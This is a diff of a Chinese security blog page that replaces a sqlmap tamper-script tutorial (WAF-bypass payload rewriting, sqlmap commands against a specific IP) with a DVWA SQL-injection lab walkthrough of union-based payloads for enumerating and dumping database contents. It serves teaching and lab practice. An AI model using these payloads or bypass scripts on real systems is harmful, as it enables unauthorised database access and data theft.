@@ -7,22 +7,21 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>sqlmap tamper 脚本编写 - Lithium</title>
+<title>DVWA的SQL注入测试 - Lithium</title>
 
 
-    <meta name="description" content="sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 使用方法： 1sqlmap.py XXXXX -tamper &quot;模块名&quot;  sqlmap脚本的tamper目录下有很多自带的tamper脚本，可以用来绕过特定的waf。 这篇文章讲的很详细：sqlmap">
+    <meta name="description" content="通过使用DVWA实例理解PHP中SQL注入漏洞产生的原理及利用方法，结合实例掌握其过滤方式。 SQL注入：在用户的输入没有被转义字符过滤时。就会发生这种形式的注入式攻击，它会传递给数据库一个SQL语句。这样就会导致应用程序的终端用户对数据库上的语句实施操纵。就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 具体来说，它是利用现有的应">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqlmap tamper 脚本编写">
-<meta property="og:url" content="https://p0st3r.github.io/2018/03/21/sqlmap-tamper-development/index.html">
+<meta property="og:title" content="DVWA的SQL注入测试">
+<meta property="og:url" content="https://p0st3r.github.io/2017/index.html">
 <meta property="og:site_name" content="Lithium">
-<meta property="og:description" content="sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 使用方法： 1sqlmap.py XXXXX -tamper &quot;模块名&quot;  sqlmap脚本的tamper目录下有很多自带的tamper脚本，可以用来绕过特定的waf。 这篇文章讲的很详细：sqlmap">
+<meta property="og:description" content="通过使用DVWA实例理解PHP中SQL注入漏洞产生的原理及利用方法，结合实例掌握其过滤方式。 SQL注入：在用户的输入没有被转义字符过滤时。就会发生这种形式的注入式攻击，它会传递给数据库一个SQL语句。这样就会导致应用程序的终端用户对数据库上的语句实施操纵。就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 具体来说，它是利用现有的应">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://p0st3r.github.io/images/og_image.png">
-<meta property="article:published_time" content="2018-03-21T00:22:27.000Z">
-<meta property="article:modified_time" content="2019-05-09T11:17:46.476Z">
+<meta property="article:published_time" content="2017-02-05T20:11:03.000Z">
+<meta property="article:modified_time" content="2019-05-09T08:10:34.318Z">
 <meta property="article:author" content="Lithium Atom">
 <meta property="article:tag" content="Sql injection">
-<meta property="article:tag" content="sqlmap">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://p0st3r.github.io/images/og_image.png">
 
@@ -32,7 +31,7 @@
 
 
 
-<link rel="alternative" href="/lithium.xml" title="sqlmap tamper 脚本编写" type="application/atom+xml">
+<link rel="alternative" href="/lithium.xml" title="DVWA的SQL注入测试" type="application/atom+xml">
 
 
 
@@ -86,7 +85,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.svg" alt="sqlmap tamper 脚本编写" height="28">
+                <img src="/images/logo.svg" alt="DVWA的SQL注入测试" height="28">
             
             </a>
         </div>
@@ -139,7 +138,7 @@
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
                 <i class="fas fa-calendar-alt"></i>&nbsp;
-                <time class="level-item has-text-grey" datetime="2018-03-21T00:22:27.000Z">2018-03-21</time>
+                <time class="level-item has-text-grey" datetime="2017-02-05T20:11:03.000Z">2017-02-06</time>
                 <i class="fas fa-archive"></i>&nbsp;
                 
                 <div class="level-item">
@@ -151,7 +150,7 @@
                     
                     <i class="fas fa-clock"></i>&nbsp;
                     
-                    6 minutes read (About 902 words)
+                    11 minutes read (About 1670 words)
                 </span>
                 
                 
@@ -165,50 +164,67 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                sqlmap tamper 脚本编写
+                DVWA的SQL注入测试
             
         </h1>
         <div class="content">
-            <h2 id="sqlmap-tamper简介"><a href="#sqlmap-tamper简介" class="headerlink" title="sqlmap tamper简介"></a>sqlmap tamper简介</h2><p>sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 使用方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py XXXXX -tamper &quot;模块名&quot;</span><br></pre></td></tr></table></figure>
-
-<p>sqlmap脚本的tamper目录下有很多自带的tamper脚本，可以用来绕过特定的waf。 这篇文章讲的很详细：sqlmap的tamper详解：<a href="http://www.myh0st.cn/index.php/archives/881/">http://www.myh0st.cn/index.php/archives/881/</a></p>
+            <p>通过使用DVWA实例理解PHP中SQL注入漏洞产生的原理及利用方法，结合实例掌握其过滤方式。</p>
+<p>SQL注入：在用户的输入没有被转义字符过滤时。就会发生这种形式的注入式攻击，它会传递给数据库一个SQL语句。这样就会导致应用程序的终端用户对数据库上的语句实施操纵。就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<p>具体来说，它是利用现有的应用出现，将（恶意）的SQL目录注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
 <a id="more"></a>
 
-<h2 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h2><p>我们从sqlmap自带的escapequotes.py了解tamper的结构。 这个脚本的作用是将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE'</span></span><br><span class="line"><span class="string">for copying permission"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">	<span class="string">""" Slash escape single and double quotes (e.g. ' -&gt; \')</span></span><br><span class="line"><span class="string">	&gt;&gt;&gt; tamper('1" AND SLEEP(5)#')</span></span><br><span class="line"><span class="string">	'1\\\\" AND SLEEP(5)#'</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="keyword">return</span> payload.replace(<span class="string">"'"</span>,<span class="string">"\\'"</span>).replace(<span class="string">'"'</span>, <span class="string">'\\"'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>可以看到tamper脚本的基本结构为 priority 变量定义和 dependencies 、 tamper 函数定义。</p>
+<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="低安全等级文件包含"><a href="#低安全等级文件包含" class="headerlink" title="低安全等级文件包含"></a>低安全等级文件包含</h2><h3 id="登陆DVWA"><a href="#登陆DVWA" class="headerlink" title="登陆DVWA"></a>登陆DVWA</h3><p>使用浏览器打开``,输入用户名密码登陆。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_45413" alt="img"></p>
+<h3 id="调整安全级别"><a href="#调整安全级别" class="headerlink" title="调整安全级别"></a>调整安全级别</h3><p>登陆后将DVWA的安全级别调整为low（见红框内）。调整之后选择SQL Injection，进入页面。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_48342" alt="img"></p>
+<h3 id="简单的ID查询"><a href="#简单的ID查询" class="headerlink" title="简单的ID查询"></a>简单的ID查询</h3><p>提示输入User ID，输入正确的ID，将显示ID First name，Surname信息。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_64727" alt="img"></p>
+<h3 id="检测是否存在注入"><a href="#检测是否存在注入" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h3><p>可以得知此处位注入点，尝试输入<code>&#39;</code>，返回错误。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_58203" alt="img"></p>
+<h3 id="遍历数据库表"><a href="#遍历数据库表" class="headerlink" title="遍历数据库表"></a>遍历数据库表</h3><p>尝试遍历数据库表，提示输入的值是ID，可以初步判断此处为数字类型的注入。尝试输入<code>1 or 1=1</code>，尝试遍历数据库表。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_24591" alt="img"></p>
+<p>可见并没有达成目的，猜测程序将此处看成了字符型，尝试输入<code>1&#39; or&#39; 1&#39; =&#39; 1</code>后遍历出了数据库中所有内容。下面尝试不同语句，得到不同的结果。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_87635" alt="img"></p>
+<h3 id="查询信息列表长度"><a href="#查询信息列表长度" class="headerlink" title="查询信息列表长度"></a>查询信息列表长度</h3><p>利用<code>order by [num]</code>语句来测试查询信息列表长度，修改num的值,这里我们输入<code>1&#39; order by 1 --</code>结果页面正常显示，<strong>注意–后面有空格</strong>。继续测试，<code>1&#39; order by 2 --</code>，<code>1&#39; order by 3 --</code>，当输入3时，页面报错。页面错误信息如下：<code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>，由此我们判断查询结果值为2列。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_15397" alt="img"></p>
+<h3 id="获取数据库名称、账户名、版本及操作系统信息"><a href="#获取数据库名称、账户名、版本及操作系统信息" class="headerlink" title="获取数据库名称、账户名、版本及操作系统信息"></a>获取数据库名称、账户名、版本及操作系统信息</h3><p>通过使用<code>user()</code>，<code>database()</code>，<code>version()</code>三个内置函数得到连接数据库的账户名、数据库名称、数据库版本信息。</p>
 <ul>
-<li><code>priority</code> 定义脚本的优先级，用于有多个tamper脚本的情况。</li>
-<li><code>dependencies</code> 函数声明该脚本适用或不适用的范围，可以为空。</li>
-<li><code>tamper</code> 是主要的函数，接受的参数为 <code>payload</code> 和 <code>**kwargs</code> ，返回值为替换后的payload。</li>
+<li>首先参数注入<code>1&#39; and 1=2 union select 1,2 --</code>(<strong>注意–后有空格</strong>)。</li>
 </ul>
-<h2 id="priority"><a href="#priority" class="headerlink" title="priority"></a>priority</h2><p>在自带的tamper脚本中一共有以下几种优先级 还可以自定义 <code>-100~100</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__priority__ &#x3D; PRIORITY.LOWEST</span><br><span class="line">__priority__ &#x3D; PRIORITY.LOWER</span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line">__priority__ &#x3D; PRIORITY.NORMAL</span><br><span class="line">__priority__ &#x3D; PRIORITY.HIGH</span><br><span class="line">__priority__ &#x3D; PRIORITY.HIGHER</span><br><span class="line">__priority__ &#x3D; PRIORITY.HIGHEST</span><br></pre></td></tr></table></figure>
-
-<h2 id="dependencies函数"><a href="#dependencies函数" class="headerlink" title="dependencies函数"></a>dependencies函数</h2><p><code>dependencies</code> 函数，对tamper脚本支持/不支持使用的环境进行声明，可以为空，如：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="keyword">from</span> lib.core.common</span><br><span class="line"><span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">	singleTimeWarnMessage(<span class="string">"tamper script '%s' is only meant to be run against %s"</span> %</span><br><span class="line">(os.path.basename(__file__).split(<span class="string">"."</span>)[<span class="number">0</span>], DBMS.ACCESS))</span><br><span class="line"><span class="comment">#singleTimeWarnMessage() 用于在控制台中打印出警告信息</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="tamper函数"><a href="#tamper函数" class="headerlink" title="tamper函数"></a>tamper函数</h2><p>tamper是整个脚本的主体。主要用于修改原本的payload，返回值为替换后的payload。 比如Kzone中通过Unicode编码关键字中的字符来绕过waf。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">	payload = payload.lower()</span><br><span class="line">	payload = payload.replace(<span class="string">'u'</span>, <span class="string">'u0075'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'o'</span>, <span class="string">'u006f'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'i'</span>, <span class="string">'u0069'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">''', 'u0027')</span></span><br><span class="line"><span class="string">	payload = payload.replace('"', 'u0022')</span></span><br><span class="line"><span class="string">	payload = payload.replace(' ', 'u0020')</span></span><br><span class="line"><span class="string">	payload = payload.replace('s', 'u0073')</span></span><br><span class="line"><span class="string">	payload = payload.replace('#', 'u0023')</span></span><br><span class="line"><span class="string">	payload = payload.replace('&gt;', 'u003e')</span></span><br><span class="line"><span class="string">	payload = payload.replace('&lt;', 'u003c')</span></span><br><span class="line"><span class="string">	payload = payload.replace('-', 'u002d')</span></span><br><span class="line"><span class="string">	payload = payload.replace('=', 'u003d')</span></span><br><span class="line"><span class="string">	return payload</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="kwargs"><a href="#kwargs" class="headerlink" title="kwargs"></a>kwargs</h2><p>在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/vanrish.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">	headers = kwargs.get(<span class="string">"headers"</span>, &#123;&#125;)</span><br><span class="line">	headers[<span class="string">"X-originating-IP"</span>] = <span class="string">"127.0.0.1"</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
-
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>恰当的使用或者编写特定的tamper脚本能够省去很多不必要的麻烦。 且编写tamper时几乎所有的sqlmap内置的<br>函数、变量都可以使用 如 <code>__priority__=PRIORITY.LOWER</code> 来源于 <code>sqlmap/lib/core/enums.py</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE'</span></span><br><span class="line"><span class="string">for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRIORITY</span>:</span></span><br><span class="line">	LOWEST = <span class="number">-100</span></span><br><span class="line">	LOWER = <span class="number">-50</span></span><br><span class="line">	LOW = <span class="number">-10</span></span><br><span class="line">	NORMAL = <span class="number">0</span></span><br><span class="line">	HIGH = <span class="number">10</span></span><br><span class="line">	HIGHER = <span class="number">50</span></span><br><span class="line">	HIGHEST = <span class="number">100</span></span><br><span class="line">....</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">DBMS</span>:</span></span><br><span class="line">	ACCESS = <span class="string">"Microsoft Access"</span></span><br><span class="line">	DB2 = <span class="string">"IBM DB2"</span></span><br><span class="line">	FIREBIRD = <span class="string">"Firebird"</span></span><br><span class="line">	MAXDB = <span class="string">"SAP MaxDB"</span></span><br><span class="line">	MSSQL = <span class="string">"Microsoft SQL Server"</span></span><br><span class="line">	MYSQL = <span class="string">"MySQL"</span></span><br><span class="line">	ORACLE = <span class="string">"Oracle"</span></span><br><span class="line">	PGSQL = <span class="string">"PostgreSQL"</span></span><br><span class="line">	SQLITE = <span class="string">"SQLite"</span></span><br><span class="line">	SYBASE = <span class="string">"Sybase"</span></span><br><span class="line">	HSQLDB = <span class="string">"HSQLDB"</span></span><br><span class="line">	INFORMIX = <span class="string">"Informix"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBMS_DIRECTORY_NAME</span>:</span></span><br><span class="line">	ACCESS = <span class="string">"access"</span></span><br><span class="line">	DB2 = <span class="string">"db2"</span></span><br><span class="line">	FIREBIRD = <span class="string">"firebird"</span></span><br><span class="line">	MAXDB = <span class="string">"maxdb"</span></span><br><span class="line">	MSSQL = <span class="string">"mssqlserver"</span></span><br><span class="line">	MYSQL = <span class="string">"mysql"</span></span><br><span class="line">	ORACLE = <span class="string">"oracle"</span></span><br><span class="line">	PGSQL = <span class="string">"postgresql"</span></span><br><span class="line">	SQLITE = <span class="string">"sqlite"</span></span><br><span class="line">	SYBASE = <span class="string">"sybase"</span></span><br><span class="line">	HSQLDB = <span class="string">"hsqldb"</span></span><br><span class="line">	INFORMIX = <span class="string">"informix"</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>一个替换关键字为空的waf</p>
-<p><img src="1.jpg" alt="1557361917185"></p>
-<p>不使用脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 sqlmap.py -u &quot;http:&#x2F;&#x2F;47.106.142.99:8008&#x2F;list.php?id&#x3D;1&quot; -D ctf --tables</span><br></pre></td></tr></table></figure>
-
-<p><img src="2.jpg" alt="2"></p>
-<p>编写脚本 test.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE'</span></span><br><span class="line"><span class="string">for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">	payload=payload.lower()</span><br><span class="line">	payload=payload.replace(<span class="string">'/*'</span>,<span class="string">'//**'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'select'</span>,<span class="string">'SeLselecteCt'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'union'</span>,<span class="string">'UnunionIoN'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'and'</span>,<span class="string">'Anandd'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'sleep'</span>,<span class="string">'SlesleepEp'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'or'</span>,<span class="string">'oorr'</span>)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">python27 sqlmap.py -u <span class="string">"http://47.106.142.99:8008/list.php?id=1"</span> --tamper=test -D ctf --</span><br><span class="line">tables</span><br></pre></td></tr></table></figure>
-
-<p><img src="3.jpg" alt="3"></p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_23692" alt="img"></p>
+<p>由上图得知，First name处显示结果位查询结果的第一列的值，surname处显示结果位查询结果第二列的值。</p>
+<ul>
+<li>通过注入<code>1&#39; and 1=2 union select user(),database() --</code>得到数据库用户为<strong>root@localhost</strong>及数据库名<strong>dvwa</strong></li>
+</ul>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_62655" alt="img"></p>
+<ul>
+<li>通过注入<code>1&#39; and 1=2 union select version(),database() --</code>得到数据库版本信息，此处数据库版本为<strong>5.0.90-community-nt</strong>。</li>
+</ul>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_83473" alt="img"></p>
+<ul>
+<li>通过注入<code>1&#39; and 1=2 union select 1,@@global.version_compile_os from mysql.user --</code>获得操作系统信息。</li>
+</ul>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_94423" alt="img"></p>
+<h3 id="查询mysql数据库所有数据库及表"><a href="#查询mysql数据库所有数据库及表" class="headerlink" title="查询mysql数据库所有数据库及表"></a>查询mysql数据库所有数据库及表</h3><p>通过注入<code>1&#39; and 1=2 union select 1,schema_name from information_schema.schemata --</code>查询mysql数据库的所有数据库名。</p>
+<p>这里利用mysql默认的数据库<strong>information_schema</strong>，该数据库存储了Mysql所以数据库和表的信息。如图所示</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_21763" alt="img"></p>
+<h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>通过注入<code>1&#39; and exists(select * from users) --</code>猜解dvwa数据库中的表名。</p>
+<p>利用<code>1&#39; and exists(select * from [表名])</code>，这里测试的结果，表名为users，在真实的渗透环境中，攻击者往往关心存储管理员用户和密码信息的表。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_36450" alt="img"></p>
+<h3 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><p>猜解字段名：<code>1&#39; and exists(select [表名] from users) --</code>。这里测试的字段名有<code>first_name</code>,<code>last_name</code>。</p>
+<p>通过注入<code>1&#39; and exists(select first_name from users) --</code>和<code>1&#39; and exists(select last_name from users) --</code>猜解字段名。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_21940" alt="img"></p>
+<h3 id="爆出数据库中字段内容"><a href="#爆出数据库中字段内容" class="headerlink" title="爆出数据库中字段内容"></a>爆出数据库中字段内容</h3><p>注入<code>1&#39; and 1=2 union select first_name,last_name from users --</code>，这里其实如果是存放管理员账户的表，那么用户名，密码信息字段就可以爆出来了。</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_94412" alt="img"></p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="low等级源代码"><a href="#low等级源代码" class="headerlink" title="low等级源代码"></a>low等级源代码</h3><p>如图所示</p>
+<p><img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_37330" alt="img"></p>
+<p>通过代码可以看出，对输入<strong>$id</strong>的值没有进行任何过滤就直接放入了SQL语句中进行处理，这样带来了极大的隐患。</p>
+<h3 id="中等等级代码分析"><a href="#中等等级代码分析" class="headerlink" title="中等等级代码分析"></a>中等等级代码分析</h3><p>将DVWA安全级别调整位medium，查看源代码。<img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_95600" alt="img"></p>
+<p>通过源代码可以看出，在中等级别时对输入的<strong>$id</strong>值使用<code>mysql_real_eascape_string()</code>函数进行了处理。在PHP中，使用<code>mysql_real_eascape_string()</code>函数用来转移SQL语句中使用字符串的特殊字符。但是使用这个函数对参数进行转换是存在绕过的。只需要将攻击字转换一下编码格式即可绕过该防护函数。比如URL编码等方式。</p>
+<p>同时发现SQL语句中变成了<code>“WHRER user_id = “$id”</code> ，此处变成了数字型注入，所以此处使用<code>mysql_real_eascape_string()</code>函数并没有起到防护作用。可以通过类似于<code>1 or 1=1</code>的语句来进行注入。</p>
+<h3 id="高等级代码分析"><a href="#高等级代码分析" class="headerlink" title="高等级代码分析"></a>高等级代码分析</h3><p>将DVWA安全级别调整为high，查看源代码。<img src="http://www.shiyanbar.com/UploadImage/2016/3/7/20_75240" alt="img"></p>
+<p>从源代码可以看出，此处为字符型注入。对传入<strong>$id</strong>的值使用<code>stripslashes()</code>函数处理以后，再经过到<code>$mysql_real_escape_string()</code>函数进行第二次过滤。在默认情况下，PHP会对所有的GET，POST和cookie数据自动运行<code>addslashes()</code>,<code>addslashes()</code>函数返回在部分与定义之前添加<code>\</code>。</p>
+<p><code>Striptslashes()</code>函数则是删除由<code>addslashes()</code>函数添加的反斜杠。在使用两个函数进行过滤之后再使用<code>is_numric()</code>函数检查<strong>$id</strong>值是否位数字，彻底断绝了注入的存在。此种防护不存在绕过的可能。</p>
 
         </div>
         
@@ -216,7 +232,7 @@
             <div class="level-start">
                 <div class="level-item">
                     <span class="is-size-6 has-text-grey has-mr-7">#</span>
-                    <a class="has-link-grey -link" href="/tags/Sql-injection/" rel="tag">Sql injection</a>, <a class="has-link-grey -link" href="/tags/sqlmap/" rel="tag">sqlmap</a>
+                    <a class="has-link-grey -link" href="/tags/Sql-injection/" rel="tag">Sql injection</a>
                 </div>
             </div>
         </div>
@@ -267,16 +283,16 @@
     <div class="level post-navigation is-flex-wrap is-mobile">
         
         <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2018/05/09/RSA-in-ctf/">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2017/">
                 <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item">CTF中RSA的常见攻击方法</span>
+                <span class="level-item">Windows服务器提权和开启3389远程连接</span>
             </a>
         </div>
         
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2017/09/12/MS08-067-analyze/">
-                <span class="level-item">MS08-067漏洞原理分析及还原</span>
+            <a class="level level-item has-link-grey  article-nav-next" href="/2016/">
+                <span class="level-item">基于KVM架构的VPS服务器搭建ss及锐速优化教程</span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
         </div>
@@ -351,7 +367,7 @@
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
-                            12
+                            13
                         </p>
                     </a>
                 </div>
@@ -363,7 +379,7 @@
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
-                            6
+                            7
                         </p>
                     </a>
                 </div>
@@ -433,38 +449,74 @@
                     Catalogue
                 </h3>
                 <ul class="menu-list"><li>
-        <a class="is-flex" href="#sqlmap-tamper简介">
+        <a class="is-flex" href="#步骤">
         <span class="has-mr-6">1</span>
-        <span>sqlmap tamper简介</span>
+        <span>步骤</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#低安全等级文件包含">
+        <span class="has-mr-6">1.1</span>
+        <span>低安全等级文件包含</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#登陆DVWA">
+        <span class="has-mr-6">1.1.1</span>
+        <span>登陆DVWA</span>
         </a></li><li>
-        <a class="is-flex" href="#lowercase-py">
-        <span class="has-mr-6">2</span>
-        <span>lowercase.py</span>
+        <a class="is-flex" href="#调整安全级别">
+        <span class="has-mr-6">1.1.2</span>
+        <span>调整安全级别</span>
         </a></li><li>
-        <a class="is-flex" href="#priority">
-        <span class="has-mr-6">3</span>
-        <span>priority</span>
